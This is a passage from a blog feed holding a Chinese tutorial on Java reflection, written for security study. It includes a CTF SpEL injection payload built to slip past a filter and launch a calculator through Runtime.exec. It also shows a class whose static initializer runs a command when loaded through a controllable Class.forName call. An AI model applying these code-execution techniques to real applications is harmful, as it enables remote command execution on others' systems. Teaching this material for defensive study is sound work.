href="https://drun1baby.top/2022/05/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87">Java反序列化基础篇-01-反序列化概念与利用 | Drunkbaby’s Blog</a></p><p><a href="https://blog.csdn.net/mocas_wang/article/details/107621010">java序列化与反序列化全讲解_序列化和反序列号需要构造无参函数的意义-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全-反射</title>
    <link href="/2025/08/14/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%B0%84/"/>
    <url>/2025/08/14/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<h1 id="Java安全-反射"><a href="#Java安全-反射" class="headerlink" title="Java安全-反射"></a>Java安全-反射</h1><h2 id="初步认识"><a href="#初步认识" class="headerlink" title="初步认识"></a>初步认识</h2><p>反射是大多数语言里都必不可少的组成部分，对象可以通过反射获取他的类，类可以通过反射拿到所有方法（包括私有），拿到的方法可以调用，总之通过“反射”，我们可以将Java这种静态语言附加上动态特性</p><p>一段代码，改变其中的变量，将会导致这段代码产生功能性的变化，可以称之为动态特性</p><p>PHP本身拥有很多动态特性，所以可以通过“一句话木马”来执行各种功能；Java虽不像PHP那么灵活， 但其提供的“反射”功能，也是可以提供一些动态特性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(String className, String methodName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br> <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(className);<br> clazz.getMethod(methodName).invoke(clazz.newInstance());<br> &#125;<br></code></pre></td></tr></table></figure><ul><li>获取类的方法： forName </li><li>实例化类对象的方法： newInstance </li><li>获取函数的方法： getMethod getConstructor</li><li>执行函数的方法： invoke</li></ul><h2 id="对反射的理解"><a href="#对反射的理解" class="headerlink" title="对反射的理解"></a>对反射的理解</h2><h3 id="正射与反射"><a href="#正射与反射" class="headerlink" title="正射与反射"></a>正射与反射</h3><p>正射</p><p>我们在编写代码时，当需要使用到某一个类的时候，都会先了解这个类是做什么的。然后实例化这个类，接着用实例化好的对象进行操作，这就是正射。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>student.doHomework(<span class="hljs-string">&quot;数学&quot;</span>);<br></code></pre></td></tr></table></figure><p>反射</p><p>反射就是，一开始并不知道我们要初始化的类对象是什么，自然也无法使用 new 关键字来创建对象了。我们以这一段经典的反射代码为例说明。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>    <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> person.getClass();<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>我们注意到在代码块中出现了大写 C 开头的 Class；</p></blockquote><p><strong>理解反射的第一步就必须先搞清楚 <code>Class</code> 是什么。</strong></p><h3 id="Java-Class-对象理解"><a href="#Java-Class-对象理解" class="headerlink" title="Java Class 对象理解"></a>Java Class 对象理解</h3><p>我们程序在运行的时候会编译生成一个 <code>.class</code> 文件，而这个 <code>.class</code> 文件中的内容就是相对应的类的所有信息，比如这段程序当中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>    <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> person.getClass();<br>&#125;<br></code></pre></td></tr></table></figure><p>其实 <code>person.class</code> 就是 <code>Class</code>，Class 也就是描述类的类。</p><p><strong>Class 类的对象作用</strong>是运行时提供或获得某个对象的类型信息。</p><blockquote><p>所以反射其实就是操作 <code>Class</code>，看清楚了，是大 C</p></blockquote><h2 id="反射的使用方法"><a href="#反射的使用方法" class="headerlink" title="反射的使用方法"></a>反射的使用方法</h2><h3 id="1-实例化对象"><a href="#1-实例化对象" class="headerlink" title="1.实例化对象"></a>1.实例化对象</h3><p>实例化对象的核心原因是：<strong>要在内存里产生一个具体的实体，才能存储和操作该类的属性、调用它的非静态方法</strong>。</p><p>非静态方法需要对象才能调用</p><ul><li>静态方法（<code>static</code>）跟类绑定，不需要对象就能用。</li><li>非静态方法依赖实例数据，所以必须先有一个对象（实例）才能执行</li></ul><p>对于普通用户我们可以采用以下方法创建实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Person</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br></code></pre></td></tr></table></figure><p>而我们在创建 Class 类的实例对象却不能使用上述方法，运行会抛出错误</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>();<br></code></pre></td></tr></table></figure><p>因为 Class 类是 <code>private</code> 私有属性，我们也无法通过创建对象的方式来获取 class 对象，那么我们怎样才能够获取到 class 对象呢？一般我们获取 class 对象就有以下三种方法，我们来逐一看看。</p><h4 id="方法一、实例化对象的getClass-方法"><a href="#方法一、实例化对象的getClass-方法" class="headerlink" title="方法一、实例化对象的getClass()方法"></a>方法一、实例化对象的getClass()方法</h4><p>如果上下⽂中存在某个类的实例 <code>obj</code>，那么我们可以通过 <code>obj.getClass</code> 来获取它的类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TestReflection</span> <span class="hljs-variable">testReflection</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestReflection</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">class3</span> <span class="hljs-operator">=</span> testReflection.getClass();<br></code></pre></td></tr></table></figure><h4 id="方法二、-使用类的-class-方法"><a href="#方法二、-使用类的-class-方法" class="headerlink" title="方法二、 使用类的 .class 方法"></a>方法二、 使用类的 .class 方法</h4><p>如果你已经加载了某个类，只是想获取到它的 <code>java.lang.Class</code> 对象，那么就直接拿它的 <code>class</code> 属性即可。这个⽅法其实不属于反射。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">class2</span> <span class="hljs-operator">=</span> TestReflection.class;<br></code></pre></td></tr></table></figure><h4 id="方法三、Class-forName-String-className-："><a href="#方法三、Class-forName-String-className-：" class="headerlink" title="方法三、Class.forName(String className)："></a>方法三、Class.forName(String className)：</h4><p>如果你知道某个类的名字，想获取到这个类，就可以使⽤ <code>forName</code> 来获取，后续要利用的话是需要实例化的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">class1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;reflection.TestReflection&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="2-获取成员变量-Field"><a href="#2-获取成员变量-Field" class="headerlink" title="2. 获取成员变量 Field"></a>2. 获取成员变量 Field</h3><p>获取成员变量Field位于 <code>java.lang.reflect.Field</code> 包中</p><p>Field[] getFields() ：获取所有 public 修饰的成员变量</p><p>Field[] getDeclaredFields() 获取所有的成员变量，不考虑修饰符</p><p>Field getField(String name) 获取指定名称的 public 修饰的成员变量</p><p>Field getDeclaredField(String name) 获取指定的成员变量</p><h3 id="3-获取成员方法-Method-都不包含构造函数"><a href="#3-获取成员方法-Method-都不包含构造函数" class="headerlink" title="3. 获取成员方法 Method(都不包含构造函数)"></a>3. 获取成员方法 Method(都不包含构造函数)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">Method <span class="hljs-title function_">getMethod</span><span class="hljs-params">(String name, 类&lt;?&gt;... parameterTypes)</span> <span class="hljs-comment">//返回该类所声明的public方法</span><br><br>Method <span class="hljs-title function_">getDeclaredMethod</span><span class="hljs-params">(String name, 类&lt;?&gt;... parameterTypes)</span> <span class="hljs-comment">//返回该类所声明的所有方法</span><br><br><span class="hljs-comment">//第一个参数获取该方法的名字，第二个参数获取标识该方法的参数类型</span><br><br>Method[] getMethods() <span class="hljs-comment">//获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法</span><br><br>Method[] getDeclaredMethods() <span class="hljs-comment">// 获取该类中的所有声明方法，包括私有的，不包括父类继承的</span><br></code></pre></td></tr></table></figure><p>在 <strong>Person.java</strong> 中添加如下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">study</span><span class="hljs-params">(String s)</span> &#123;  <br>    System.out.println(<span class="hljs-string">&quot;学习中...&quot;</span> + s);  <br>&#125;  <br><span class="hljs-keyword">private</span> String <span class="hljs-title function_">sleep</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;  <br>    System.out.println(<span class="hljs-string">&quot;睡眠中...&quot;</span> + age);  <br> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;sleep&quot;</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><p>并在 <strong>ReflectionTest02.java</strong> 中添加如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;  <br>  <br><span class="hljs-keyword">import</span> com.sun.xml.internal.ws.encoding.MtomCodec;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReflectionTest02</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;src.Person&quot;</span>);<span class="hljs-comment">// 创建 Class 对象  </span><br> Method[] methods1 = c1.getDeclaredMethods();<span class="hljs-comment">// 获取所有该类中的所有方法  </span><br> Method[] methods2 = c1.getMethods();<span class="hljs-comment">// 获取所有的 public 方法，包括类自身声明的 public 方法，父类中的  、实现的接口方法  </span><br>  <br> <span class="hljs-keyword">for</span> (Method m:methods1)&#123;  <br>            System.out.println(m);  <br> &#125;  <br>        System.out.println(<span class="hljs-string">&quot;-------分割线---------&quot;</span>);  <br>  <br> <span class="hljs-keyword">for</span> (Method m:methods2) &#123;  <br>            System.out.println(m);  <br> &#125;  <br>  <br>        System.out.println(<span class="hljs-string">&quot;-------分割线---------&quot;</span>);  <br>  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">methods3</span> <span class="hljs-operator">=</span> c1.getMethod(<span class="hljs-string">&quot;study&quot;</span>, String.class);<span class="hljs-comment">// 获取 Public 的 study 方法  </span><br> System.out.println(methods3);  <br> System.out.println(<span class="hljs-string">&quot;-------分割线---------&quot;</span>);  <br>  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">methods4</span> <span class="hljs-operator">=</span> c1.getDeclaredMethod(<span class="hljs-string">&quot;sleep&quot;</span>, <span class="hljs-type">int</span>.class); <span class="hljs-comment">// 获取 Private 的 sleep 方法  </span><br> System.out.println(methods4);  <br> &#125;  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a02.png"></p><h3 id="4-获取构造函数"><a href="#4-获取构造函数" class="headerlink" title="4. 获取构造函数"></a>4. 获取构造函数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Constructor&lt;?&gt;[] getConstructors() ：只返回<span class="hljs-keyword">public</span>构造函数<br><br>Constructor&lt;?&gt;[] getDeclaredConstructors() ：返回所有生命的构造函数<br><br>Constructor&lt;&gt; getConstructor(类&lt;?&gt;... parameterTypes) : 匹配和参数配型相符的<span class="hljs-keyword">public</span>构造函数<br><br>Constructor&lt;&gt; getDeclaredConstructor(类&lt;?&gt;... parameterTypes) ： 匹配和参数配型相符的构造函数<br></code></pre></td></tr></table></figure><h2 id="反射涉及的方法"><a href="#反射涉及的方法" class="headerlink" title="反射涉及的方法"></a>反射涉及的方法</h2><h3 id="forName方法"><a href="#forName方法" class="headerlink" title="forName方法"></a>forName方法</h3><p>forName 不不是获取“类”的唯一途径，通常来说我们有如下三种方式获取一个“类”，也就 是java.lang.Class对象：</p><ul><li>obj.getClass() 如果上下文中存在某个类的实例obj ，那么我们可以直接通过obj.getClass() 来获取它的类 </li><li>Test.class 如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接拿它的 class 属性即可。这个方法其实不属于反射。</li><li>Class.forName 如果你知道某个类的名字，想获取到这个类，就可以使用 forName 来获取</li></ul><p>在安全研究中，我们使用反射的一大目的，就是绕过某些沙盒。比如，上下文中如果只有Integer类型的数字，我们如何获取到可以执行命令的Runtime类呢？也许可以这样（伪代码）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1.</span>getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<br></code></pre></td></tr></table></figure><p>关于绕沙盒，之前Code-Breaking 2018p神出了一道SpEL的题目(学习SpEL注入时还用来做实例记录了)</p><p><a href="http://rui0.cn/archives/1015">Code-Breaking Puzzles — javacon WriteUp – Ruilin</a></p><p>当时的payload(弹出计算器)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">#&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.la&#x27;</span>+<span class="hljs-string">&#x27;ng.Ru&#x27;</span>+<span class="hljs-string">&#x27;ntime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ec&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>.getClass()).invoke(<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.la&#x27;</span>+<span class="hljs-string">&#x27;ng.Ru&#x27;</span>+<span class="hljs-string">&#x27;ntime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;getRu&#x27;</span>+<span class="hljs-string">&#x27;ntime&#x27;</span>).invoke(<span class="hljs-literal">null</span>),<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><h4 id="forName有两个函数重载："><a href="#forName有两个函数重载：" class="headerlink" title="forName有两个函数重载："></a>forName有两个函数重载：</h4><ul><li>Class forName(String name) </li><li>Class forName(String name, <strong>boolean</strong> initialize, ClassLoader loader)</li></ul><p> 第一个就是我们最常见的获取class的方式，其实可以理解为第二种方式的一个封装</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Class.forName(className)<br> <span class="hljs-comment">// 等于</span><br>Class.forName(className, <span class="hljs-literal">true</span>, currentLoader)<br></code></pre></td></tr></table></figure><p>默认情况下， forName 的第一个参数是类名；第二个参数表示是否初始化；第三个参数就 是ClassLoader</p><h5 id="第三个参数ClassLoader"><a href="#第三个参数ClassLoader" class="headerlink" title="第三个参数ClassLoader"></a>第三个参数ClassLoader</h5><p>ClassLoader 就是一个“加载器”，告诉Java虚拟机如何加载这个类。Java默认的ClassLoader是根据类名加载类，这个类名是类完整路径，如 java.lang.Runtime 。</p><h5 id="第二个参数initialize："><a href="#第二个参数initialize：" class="headerlink" title="第二个参数initialize："></a>第二个参数initialize：</h5><p>在 forName 的时候，构造函数并不会执行，即使我们设置initialize&#x3D;true。</p><p>那么这个初始化究竟指什么呢？</p><p>可以将这个“初始化”理解为类的初始化。我们先来看看如下这个类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrainPrint</span> &#123;<br>    &#123;<br>        System.out.printf(<span class="hljs-string">&quot;Empty block initial %s\n&quot;</span>, <span class="hljs-built_in">this</span>.getClass());<br>    &#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.printf(<span class="hljs-string">&quot;Static initial %s\n&quot;</span>, TrainPrint.class);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TrainPrint</span><span class="hljs-params">()</span> &#123;<br>        System.out.printf(<span class="hljs-string">&quot;Initial %s\n&quot;</span>, <span class="hljs-built_in">this</span>.getClass());<br>    &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>三个“初始化”方法有什么区别，调用顺序是什么，在安全上有什么价值?</p><p>首先调用的是static {}，其次是{}，最后是构造函数。</p><p>其中，static {}就是在“类初始化”的时候调用的，而{}中的代码会放在构造函数的super()[调用父类的构造方法]后面， 但在当前构造函数内容的前面。所以说，forName中的initialize&#x3D;true其实就是告诉Java虚拟机是否执行”类初始化“。</p><p>那么，假设我们有如下函数，其中函数的参数name可控</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ref</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    Class.forName(name);<br> &#125;<br>---<br>静态方法调用，直接用类名调用。<br>作用：根据类的全限定名（包名 + 类名），加载并初始化类（会执行静态代码块）。<br>name 必须是类的全限定名，例如 <span class="hljs-string">&quot;com.example.MyClass&quot;</span>。<br>Class.forName() 属于 java.lang.Class，是一个静态方法，不需要对象实例。<br></code></pre></td></tr></table></figure><p>我们就可以编写一个恶意类，将恶意代码放置在static {}中，从而执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.Runtime;<br> <span class="hljs-keyword">import</span> java.lang.Process;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TouchFile</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>            String[] commands = &#123;<span class="hljs-string">&quot;touch&quot;</span>, <span class="hljs-string">&quot;/tmp/success&quot;</span>&#125;;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> rt.exec(commands);<br>            pc.waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-comment">// do nothing</span><br>        &#125;<br>    &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用forName就不需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类。</p><h3 id="newInstance方法-无参构造函数-单例模式静态方法"><a href="#newInstance方法-无参构造函数-单例模式静态方法" class="headerlink" title="newInstance方法(无参构造函数,单例模式静态方法)"></a>newInstance方法(无参构造函数,单例模式静态方法)</h3><p>我们经常在一些源码里看到，类名的部分包含$符号，比如fastjson在checkAutoType 时候就会先将$替换成 . :</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br></code></pre></td></tr></table></figure><p>$ 的作用是查找内部类。</p><p>Java的普通类 C1 中支持编写内部类C2，而在编译的时候，会生成两个文件： C1.class 和 C1$C2.class ，我们可以把他们看作两个无关的类，通过 Class.forName(“C1$C2”) 即可加载这个内部类。</p><p>获得类以后，我们可以继续使用反射来获取这个类中的属性,方法，也可以实例化这个类，并调用方法。</p><p>class.newInstance() 的作用就是调用这个类的无参构造函数，这个比较好理解。不过，我们有时候在写漏洞利用方法的时候，会发现使用 newInstance 总是不成功，这时候原因可能是</p><ol><li>你使用的类没有无参构造函数 </li><li>你使用的类构造函数是私有的</li></ol><p>最最最常见的情况就是 java.lang.Runtime ，这个类在我们构造命令执行Payload的时候很常见，但 我们不能直接这样来执行命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="hljs-string">&quot;id&quot;</span>);<br></code></pre></td></tr></table></figure><p>会报错</p><p>原因是 Runtime 类的构造方法是私有的</p><h4 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h4><p>类的构造方法是私有的</p><p>比如，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建立一个连接，此时作为开发者你就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrainDB</span> &#123;<br> <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">TrainDB</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TrainDB</span>();<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> TrainDB <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br> <span class="hljs-keyword">return</span> instance;<br> &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">TrainDB</span><span class="hljs-params">()</span> &#123;<br> <span class="hljs-comment">// 建立连接的代码...</span><br> &#125;<br>&#125;<br><br><br><span class="hljs-comment">//private static TrainDB instance = new TrainDB(); </span><br><span class="hljs-comment">// ↑ 这里在类加载时自动调用私有构造方法</span><br><span class="hljs-comment">//调用构造方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// 正确获取实例的方式</span><br>        <span class="hljs-type">TrainDB</span> <span class="hljs-variable">db1</span> <span class="hljs-operator">=</span> TrainDB.getInstance();<br>        <span class="hljs-type">TrainDB</span> <span class="hljs-variable">db2</span> <span class="hljs-operator">=</span> TrainDB.getInstance();<br>        <br>        <span class="hljs-comment">// 验证确实是同一个实例</span><br>        System.out.println(db1 == db2); <span class="hljs-comment">// 输出 true</span><br>        <br>        <span class="hljs-comment">// 错误尝试（无法编译）：</span><br>        <span class="hljs-comment">// TrainDB db3 = new TrainDB();</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样，只有类初始化的时候会执行一次构造函数，后面只能通过 getInstance 获取这个对象，避免建立多个数据库连接。</p><p>Runtime类就是单例模式，我们只能通过 Runtime.getRuntime() 来获取到 Runtime 对象。我们将上述Payload进行修改即可正常执行命令了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, <br>String.class).invoke(clazz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(clazz), <br><span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="getMethod方法-公有方法"><a href="#getMethod方法-公有方法" class="headerlink" title="getMethod方法(公有方法)"></a>getMethod方法(公有方法)</h3><p>getMethod 的作用是通过反射获取一个类的某个特定的公有方法。Java中 支持类的重载，我们不能仅通过函数名来确定一个函数。所以，在调用getMethod的时候，我们需要传给他你需要获取的函数的参数类型列表。</p><p>比如这里的 Runtime.exec 方法有6个重载：</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a01.png"></p><p>我们使用第一个，它只有一个参数，类型是String，所以我们使用 getMethod(“exec”, String.class) 来获取 Runtime.exec 方法。</p><h3 id="invoke方法"><a href="#invoke方法" class="headerlink" title="invoke方法"></a>invoke方法</h3><p>invoke 的作用是执行方法，它的第一个参数是： </p><ul><li>如果这个方法是一个普通方法，那么第一个参数是类对象 